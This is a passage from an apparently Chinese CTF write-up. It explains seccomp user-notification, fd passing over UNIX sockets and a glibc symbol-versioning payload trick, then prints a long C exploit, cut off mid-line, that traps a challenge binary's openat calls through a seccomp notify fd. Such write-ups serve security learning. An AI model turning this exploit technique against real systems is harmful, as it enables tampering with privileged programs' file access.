<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br>sockfd = socket(<span class="hljs-keyword">int</span> socket_family, <span class="hljs-keyword">int</span> socket_type, <span class="hljs-keyword">int</span> protocol);<br></code></pre></div></td></tr></table></figure>

<p>其中socket_family=AF_UNIX, socket_type有三种(TCP UDP SCTP?)</p>
<p>send是fd和recvfd函数都是使用sendmsg来…..看不懂, 一堆宏定义, 反正知道他能通过socket fd来传递fd就行了. </p>
<ul>
<li>seccomp unotify:<code>seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &amp;prog);</code> </li>
</ul>
<p>因为glibc没有对seccomp wrap, 所以实际上是:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">seccomp</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> operation, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">void</span> *args)</span></span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_seccomp, operation, flags, args); &#125;<br></code></pre></div></td></tr></table></figure>

<p>第一个<code>SECCOMP_SET_MODE_FILTER</code>就是指把arg当成BPF指针来定义一个filter. 这个filter在fork clone execve的时候保留下来. <strong>前提</strong>是调用的线程必须在它的namespace里有CAP_SYS_ADMIN, 或者已经设置了no_new_privs位. </p>
<p>一般都关注后者, 也就是通过<code>prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)</code>设置. 这个process control函数配上这些参数能够限制execve执行setuid的程序, 否则通过execve执行setuid程序后装载一个不执行<code>setuid()</code>且返回0的filter时, 这样的程序会在没有真正drop privileges的情况下继续运行malicious commands. </p>
<p>而第二个参数flags要使用<code>SECCOMP_FILTER_FLAG_NEW_LISTENER</code>, 这样成功安装filter后，返回一个新的user-space notification file。(为文件描述符设置了“close-on-exec” flag。)当filter返回SECCOMP_RET_USER_NOTIF时，将向该fd发送通知。每线程最多只能装载一个带有这个flag的filter.</p>
<ul>
<li><code>SECCOMP_IOCTL_NOTIF_ADDFD</code> </li>
</ul>
<p>The SECCOMP_IOCTL_NOTIF_ADDFD operation (available since Linux5.9) allows the supervisor to <strong>install a file descriptor</strong> into thetarget’s file descriptor table. </p>
<ul>
<li><a target="_blank" rel="noopener" href="http://web.mit.edu/rhel-doc/3/rhel-as-en-3/symver.html"><code>.symver</code></a> directive and <a target="_blank" rel="noopener" href="https://gcc.gnu.org/wiki/SymbolVersioning">SymbolVersioning</a> | <a target="_blank" rel="noopener" href="https://sourceware.org/binutils/docs/ld/VERSION.html"><em>linker script</em> VERSION command</a> </li>
</ul>
<p>总之就是将symbol绑定到version node上, 一个symbol可以有多个version node, 最关键的是map file.</p>
<p>同时可以在库的源代码中添加绑定信息, 这样可以减少shared library maintainr的工作, 不过此时mapfile必须包括所有的version node, 也就是这个asm trick只是mapfile的补充. </p>
<p>经过测试, solution中的payload.c可以大幅度缩减, payload.map也可以删去2.34的定义:</p>
<ul>
<li>puts完全没必要, 只要<code>__libc_start_main</code>被修改为write函数之后就已经达成目的. </li>
<li>源码中使用asm把<code>__libc_start_main_impl</code>当做<code>__libc_start_main</code>的alias,<br>不过也可以直接不要impl, 直接<code>__libc_start_main</code>就行了</li>
<li>头文件也没必要. 2.2.5也没必要. 为什么是这个版本号我也不知道. </li>
</ul>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;limits.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/audit.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/un.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> errExit(msg)    \</span><br><span class="hljs-meta">  do                    \</span><br><span class="hljs-meta">  &#123;                     \</span><br><span class="hljs-meta">    perror(msg);        \</span><br><span class="hljs-meta">    exit(EXIT_FAILURE); \</span><br><span class="hljs-meta">  &#125; while (0)</span><br><br><span class="hljs-comment">/* Send the file descriptor &#x27;fd&#x27; over the connected UNIX domain socket</span><br><span class="hljs-comment">  &#x27;sockfd&#x27;. Returns 0 on success, or -1 on error. */</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sendfd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockfd, <span class="hljs-keyword">int</span> fd)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msgh</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br>  <span class="hljs-keyword">int</span> data;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmsgp</span>;</span><br><br>  <span class="hljs-comment">/* Allocate a char array of suitable size to hold the ancillary data.</span><br><span class="hljs-comment">     However, since this buffer is in reality a &#x27;struct cmsghdr&#x27;, use a</span><br><span class="hljs-comment">     union to ensure that it is suitably aligned. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-keyword">char</span> buf[CMSG_SPACE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))];<br>    <span class="hljs-comment">/* Space large enough to hold an &#x27;int&#x27; */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> <span class="hljs-title">align</span>;</span><br>  &#125; controlMsg;<br><br>  <span class="hljs-comment">/* The &#x27;msg_name&#x27; field can be used to specify the address of the</span><br><span class="hljs-comment">     destination socket when sending a datagram. However, we do not</span><br><span class="hljs-comment">     need to use this field because &#x27;sockfd&#x27; is a connected socket. */</span><br><br>  msgh.msg_name = <span class="hljs-literal">NULL</span>;<br>  msgh.msg_namelen = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* On Linux, we must transmit at least one byte of real data in</span><br><span class="hljs-comment">     order to send ancillary data. We transmit an arbitrary integer</span><br><span class="hljs-comment">     whose value is ignored by recvfd(). */</span><br><br>  msgh.msg_iov = &amp;iov;<br>  msgh.msg_iovlen = <span class="hljs-number">1</span>;<br>  iov.iov_base = &amp;data;<br>  iov.iov_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>);<br>  data = <span class="hljs-number">12345</span>;<br><br>  <span class="hljs-comment">/* Set &#x27;msghdr&#x27; fields that describe ancillary data */</span><br><br>  msgh.msg_control = controlMsg.buf;<br>  msgh.msg_controllen = <span class="hljs-keyword">sizeof</span>(controlMsg.buf);<br><br>  <span class="hljs-comment">/* Set up ancillary data describing file descriptor to send */</span><br><br>  cmsgp = CMSG_FIRSTHDR(&amp;msgh);<br>  cmsgp-&gt;cmsg_level = SOL_SOCKET;<br>  cmsgp-&gt;cmsg_type = SCM_RIGHTS;<br>  cmsgp-&gt;cmsg_len = CMSG_LEN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>  <span class="hljs-built_in">memcpy</span>(CMSG_DATA(cmsgp), &amp;fd, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br><br>  <span class="hljs-comment">/* Send real plus ancillary data */</span><br><br>  <span class="hljs-keyword">if</span> (sendmsg(sockfd, &amp;msgh, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* Receive a file descriptor on a connected UNIX domain socket. Returns</span><br><span class="hljs-comment">  the received file descriptor on success, or -1 on error. */</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">recvfd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockfd)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msgh</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br>  <span class="hljs-keyword">int</span> data, fd;<br>  <span class="hljs-keyword">ssize_t</span> nr;<br><br>  <span class="hljs-comment">/* Allocate a char buffer for the ancillary data. See the comments</span><br><span class="hljs-comment">     in sendfd() */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-keyword">char</span> buf[CMSG_SPACE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> <span class="hljs-title">align</span>;</span><br>  &#125; controlMsg;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmsgp</span>;</span><br><br>  <span class="hljs-comment">/* The &#x27;msg_name&#x27; field can be used to obtain the address of the</span><br><span class="hljs-comment">     sending socket. However, we do not need this information. */</span><br><br>  msgh.msg_name = <span class="hljs-literal">NULL</span>;<br>  msgh.msg_namelen = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* Specify buffer for receiving real data */</span><br><br>  msgh.msg_iov = &amp;iov;<br>  msgh.msg_iovlen = <span class="hljs-number">1</span>;<br>  iov.iov_base = &amp;data; <span class="hljs-comment">/* Real data is an &#x27;int&#x27; */</span><br>  iov.iov_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>);<br><br>  <span class="hljs-comment">/* Set &#x27;msghdr&#x27; fields that describe ancillary data */</span><br><br>  msgh.msg_control = controlMsg.buf;<br>  msgh.msg_controllen = <span class="hljs-keyword">sizeof</span>(controlMsg.buf);<br><br>  <span class="hljs-comment">/* Receive real plus ancillary data; real data is ignored */</span><br><br>  nr = recvmsg(sockfd, &amp;msgh, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (nr == <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  cmsgp = CMSG_FIRSTHDR(&amp;msgh);<br><br>  <span class="hljs-comment">/* Check the validity of the &#x27;cmsghdr&#x27; */</span><br><br>  <span class="hljs-keyword">if</span> (cmsgp == <span class="hljs-literal">NULL</span> || cmsgp-&gt;cmsg_len != CMSG_LEN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)) ||<br>      cmsgp-&gt;cmsg_level != SOL_SOCKET || cmsgp-&gt;cmsg_type != SCM_RIGHTS)<br>  &#123;<br>    errno = EINVAL;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">/* Return the received file descriptor to our caller */</span><br><br>  <span class="hljs-built_in">memcpy</span>(&amp;fd, CMSG_DATA(cmsgp), <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>  <span class="hljs-keyword">return</span> fd;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sigchldHandler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// char msg[] = &quot;\tS: target has terminated; bye\n&quot;;</span><br><br>  <span class="hljs-comment">// write(STDOUT_FILENO, msg, sizeof(msg) - 1);</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Child exited&quot;</span>);<br>  _exit(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">seccomp</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> operation, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">void</span> *args)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_seccomp, operation, flags, args);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> X32_SYSCALL_BIT 0x40000001</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR                                  \</span><br><span class="hljs-meta">  BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch))),   \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 0, 2),            \</span><br><span class="hljs-meta">      BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))), \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP | BPF_JGE | BPF_K, X32_SYSCALL_BIT, 0, 1),              \</span><br><span class="hljs-meta">      BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS)</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">installNotifyFilter</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> &#123;<br>      X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR,<br><br>      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_USER_NOTIF),<br><br>      BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),<br>  &#125;;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">prog</span> =</span> &#123;<br>      .len = <span class="hljs-keyword">sizeof</span>(filter) / <span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>]),<br>      .filter = filter,<br>  &#125;;<br><br>  <span class="hljs-keyword">int</span> notifyFd =<br>      seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &amp;prog);<br>  <span class="hljs-keyword">if</span> (notifyFd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;seccomp-install-notify-filter&quot;</span>);<br><br>  <span class="hljs-keyword">return</span> notifyFd;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">closeSocketPair</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (close(sockPair[<span class="hljs-number">0</span>]) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;closeSocketPair-close-0&quot;</span>);<br>  <span class="hljs-keyword">if</span> (close(sockPair[<span class="hljs-number">1</span>]) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;closeSocketPair-close-1&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">pid_t</span> <span class="hljs-title">targetProcess</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>], <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">pid_t</span> targetPid = fork();<br>  <span class="hljs-keyword">if</span> (targetPid == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;fork&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (targetPid &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">/* In parent, return PID of child */</span><br>    <span class="hljs-keyword">return</span> targetPid;<br><br>  <span class="hljs-keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>    errExit(<span class="hljs-string">&quot;prctl&quot;</span>);<br><br>  <span class="hljs-keyword">int</span> notifyFd = installNotifyFilter();<br><br>  <span class="hljs-keyword">if</span> (sendfd(sockPair[<span class="hljs-number">0</span>], notifyFd) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;sendfd&quot;</span>);<br><br>  <span class="hljs-comment">/* Notification and socket FDs are no longer needed in target */</span><br><br>  <span class="hljs-keyword">if</span> (close(notifyFd) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;close-target-notify-fd&quot;</span>);<br><br>  closeSocketPair(sockPair);<br><br>  <span class="hljs-comment">/* Perform a mkdir() call for each of the command-line arguments */</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Executing child&quot;</span>);<br>  sleep(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">char</span> *f = <span class="hljs-literal">NULL</span>;<br>  execve(<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>, &amp;f, &amp;f);<br>  <span class="hljs-comment">// openat(AT_FDCWD,&quot;/bin/bash&quot;,0);</span><br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">allocSeccompNotifBuffers</span><span class="hljs-params">(struct seccomp_notif **req,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     struct seccomp_notif_resp **resp,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     struct seccomp_notif_sizes *sizes)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (seccomp(SECCOMP_GET_NOTIF_SIZES, <span class="hljs-number">0</span>, sizes) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;seccomp-SECCOMP_GET_NOTIF_SIZES&quot;</span>);<br><br>  *req = <span class="hljs-built_in">malloc</span>(sizes-&gt;seccomp_notif);<br>  <span class="hljs-keyword">if</span> (*req == <span class="hljs-literal">NULL</span>)<br>    errExit(<span class="hljs-string">&quot;malloc-seccomp_notif&quot;</span>);<br><br>  <span class="hljs-keyword">size_t</span> resp_size = 